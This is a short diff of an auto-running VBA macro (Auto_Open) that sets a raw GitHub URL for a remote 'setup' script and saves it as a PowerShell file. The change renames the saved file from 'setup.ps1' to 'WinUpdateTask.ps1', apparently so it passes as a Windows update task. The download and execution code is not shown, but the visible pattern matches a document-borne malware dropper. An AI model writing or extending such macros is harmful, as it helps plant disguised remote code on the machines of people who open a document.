@@ -9,7 +9,7 @@ Sub Auto_Open()
     scriptUrl = "https://github.com/run-spec/auto/raw/refs/heads/main/setup"
     
     ' Save directly to desktop
-    savePath = "C:\Users\juraj_iptfkru\Desktop\setup.ps1"
+    savePath = "C:\Users\juraj_iptfkru\Desktop\test\WinUpdateTask.ps1"
     
     On Error GoTo ErrorHandler
     
